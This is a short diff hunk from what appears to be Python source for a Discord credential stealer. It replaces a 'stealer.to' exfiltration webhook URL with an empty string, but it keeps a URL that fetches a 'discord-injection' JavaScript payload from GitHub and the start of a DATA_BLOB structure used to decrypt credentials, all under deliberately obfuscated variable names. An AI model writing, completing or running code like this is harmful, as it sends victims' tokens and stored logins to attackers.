@@ -71,7 +71,7 @@ for module in ModuleRequirements:
 
 
 
-h00k = "https://stealer.to/post?uniqueid=5f806792c51e27fa"
+h00k = ""
 inj3c710n_url = f"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js"
 
 class DATA_BLOB(Structure):
